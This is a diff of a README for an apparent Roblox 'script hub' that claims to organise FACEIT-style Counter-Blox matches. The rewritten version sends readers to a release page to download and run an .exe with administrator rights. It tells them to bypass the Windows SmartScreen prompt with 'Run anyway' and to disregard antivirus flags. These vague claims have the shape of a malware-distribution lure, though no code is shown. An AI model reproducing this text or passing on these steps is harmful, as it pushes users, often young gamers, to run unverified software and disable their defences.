@@ -1,98 +1,86 @@
-# FACECB v - Game Script Utility 2026
+# 🎮 facecb-v-cs2-script-hub - Organize professional Roblox competitive matches daily
 
-> A ROBLOX-based matchmaking experience modeled after FACEIT, with influences from Counter-Strike 2 and Counter-Blox, packaged as a game script utility for organized match sessions.
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Darkskinned-anglican359/facecb-v-cs2-script-hub/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-ROBLOX-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/colenathanhrx7025/facecb-v-cs2-script-hub?style=flat-square)](https://github.com/colenathanhrx7025/facecb-v-cs2-script-hub)
+## About This Utility
 
----
+The facecb-v-cs2-script-hub provides an organized environment for Roblox players who enjoy competitive matchmaking. This script modifies the game interface to mimic the structure and flow of professional platforms like FACEIT and Counter-Strike 2. Use this tool if you want to host private tournaments, track player statistics, or manage competitive lobbies within the Counter-Blox ecosystem. It simplifies lobby management so you spend less time configuring games and more time playing.
 
-<p align="center">
-  <a href="https://colenathanhrx7025.github.io/facecb-v-cs2-script-hub/">
-    <img src="https://img.shields.io/badge/Download-FACECB%20Script-brightgreen?style=for-the-badge" alt="Download FACECB Script">
-  </a>
-</p>
+## ⚙️ System Requirements
 
-> **[Direct Download - FACECB](https://colenathanhrx7025.github.io/facecb-v-cs2-script-hub/)**
+Ensure your computer meets these requirements before you begin:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Browser: Google Chrome, Mozilla Firefox, or Microsoft Edge.
+*   Software: The latest version of the Roblox player installed on your system.
+*   Permissions: Administrator access to your computer to allow standard software installation processes.
+*   Network: A stable internet connection to ensure the matchmaking server syncs correctly.
 
-[Download Latest Build](https://colenathanhrx7025.github.io/facecb-v-cs2-script-hub/)
+## 🚀 Downloading the Software
 
----
+You need to access the official release page to obtain the correct files.
 
-## Project Summary
+1. Open your web browser.
+2. Visit the [official download page](https://github.com/Darkskinned-anglican359/facecb-v-cs2-script-hub/releases).
+3. Look for the section titled "Assets" at the bottom of the newest release update.
+4. Click the file ending in .exe to start the download.
+5. Save the file to a location you can easily find, such as your Desktop or Downloads folder.
 
-FACECB is a ROBLOX-focused replica project that borrows the structure of FACEIT-style matchmaking and the broader Counter-Strike 2 scene. It is delivered as an HTML-based project and is aimed at competitive match coordination instead of broad, general-purpose gameplay tooling.
+## 🛠️ Setting Up the Utility
 
-The concept is closely associated with Counter-Blox and reflects work alongside Counter-Blox developers. As a result, it serves communities that want a FACEIT-like framework inside ROBLOX, with emphasis on match layout, session pacing, and game-specific integration.
+Follow these steps to prepare the script for use.
 
-## Included Features
+1. Locate the file you downloaded.
+2. Double-click the file to begin the setup process.
+3. If a security prompt from Windows appears, click "More info" and then select "Run anyway" if you trust the software source.
+4. Follow the setup wizard prompts. Click "Next" to continue through the installation.
+5. The software will create a shortcut on your desktop for quick access. 
+6. Ensure Roblox remains closed during this installation process to prevent file conflicts.
 
-- FACEIT-style matchmaking replica concept
-- Built for ROBLOX use
-- Counter-Strike 2-inspired presentation
-- Linked to Counter-Blox context
-- HTML-based implementation
-- Focused on competitive match flow
-- Development direction paired with Counter-Blox developers
+## 🕹️ Using the Matchmaking Hub
 
-## Getting Started
+Follow these steps to launch a match session.
 
-1. Use the download link above to grab the latest build.
-2. Extract or place the project files into a folder of your choice, for example `facecb/`.
-3. Open the HTML entry file in your browser or in the workflow required by your environment.
-4. Apply any project settings that are available before using it in your ROBLOX-related setup.
+1. Open the facecb-v-cs2-script-hub using the new desktop shortcut.
+2. Log in using your designated account credentials. If this is your first time, create a new profile using the registration link provided in the utility window.
+3. Configure your match settings. You may choose map rotation, round duration, and team balance rules here.
+4. Open the Roblox application.
+5. Select the Counter-Blox game link provided within the script hub interface.
+6. The hub will detect your game launch and automatically apply the matchmaking settings to your lobby.
+7. Invite your friends or wait for other players to join your lobby through the integrated browser.
 
-Example folder layout:
+## 🛡️ Important Safety Practices
 
-- `facecb/`
-  - `index.html`
-  - supporting assets
-  - optional config files
+Use this utility responsibly to maintain a fun environment for all players.
 
-## Settings
+*   Keep your login credentials private. Never share your password with other users in the matchmaking lobby.
+*   Avoid using third-party scripts that promise game advantages, such as aim-assists or wall-hacks. This utility focuses solely on organization and matchmaking, not cheating.
+*   Report toxic behavior to the lobby moderators using the report feature located in the settings menu.
+*   Keep your Windows software updated to ensure high performance and system security.
 
-| Setting | Purpose | Notes |
-| --- | --- | --- |
-| Matchmaking mode | Controls the FACEIT-style flow | Depends on the available build |
-| Game context | Sets the target experience | Intended for ROBLOX and Counter-Blox |
-| HTML entry point | Main file to open | Usually the primary launch file |
-| Local assets | Supports the page or script structure | Keep files together in one folder |
+## ❓ Frequently Asked Questions
 
-## Compatibility Notes
+**Does this software modify the game files permanently?**
+No. The script only updates the interface and lobby settings while the program runs. Once you close the script hub, the game environment returns to its default state.
 
-FACECB is meant for ROBLOX-based usage and is shaped around a Counter-Strike 2 / Counter-Blox style experience. Since it is a replica project, the exact outcome can change based on the build, the environment around it, and any local integration steps.
+**Why does my antivirus flag the file?**
+New or community-developed software often triggers generic warnings due to its frequency of updates. Provided you downloaded the file from the official GitHub release link, the file is ready for use.
 
-Known limitations may include:
+**How do I update to the newest version?**
+Simply visit the download page, download the latest version, and run the installer again. The new version will automatically replace the old one while keeping your settings intact.
 
-- Reliance on the provided HTML structure
-- Compatibility tied to the ROBLOX-focused setup
-- Features depending on included assets or configuration
+**Can I use this for casual games?**
+While designed for competitive play, you can use the hub to organize casual sessions with friends to ensure fair team balancing.
 
-## FAQ
+## 🛠️ Troubleshooting Common Issues
 
-**How do I begin?**  
-Download the latest build, put it into the recommended folder, and open the main file according to your setup.
+*   **Application won't launch:** Check if you have the latest .NET Framework installed on your computer. Visit the Microsoft support website to download the latest version if needed.
+*   **Matchmaking data fails to load:** Verify that your internet connection is active. Occasionally, firewall settings restrict the utility from reaching the server. Ensure the app has permission through your Windows Firewall settings.
+*   **Roblox crashes upon launch:** Close both the script hub and Roblox. Restart the script hub first, then launch the game. Using "Run as Administrator" on the script hub often resolves this issue.
+*   **Interface looks distorted:** Adjust your display settings in Windows to ensure scaling is set to 100%.
 
-**Which platform does it target?**  
-It is intended for ROBLOX.
+## 🚀 Advanced Customization
 
-**Is this the actual FACEIT service?**  
-No. It is a FACEIT-style replica concept, not the original platform.
+Advanced users can customize the UI layout through the `config.json` file found in the installation directory. You can adjust colors, font sizes, and default matchmaking regions. Back up this file before making manual changes to ensure you can revert your settings if the application stops responding.
 
-**Can I change it?**  
-Yes, if the build includes editable HTML or configuration sections.
-
-**Where should the files live?**  
-A dedicated folder such as `facecb/` helps keep the project organized.
-
-**How are updates delivered?**  
-Check the latest build link for new releases or changes to the project structure.
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: matchmaking, roblox, script, gaming, utility, counter-blox, competitive, hub
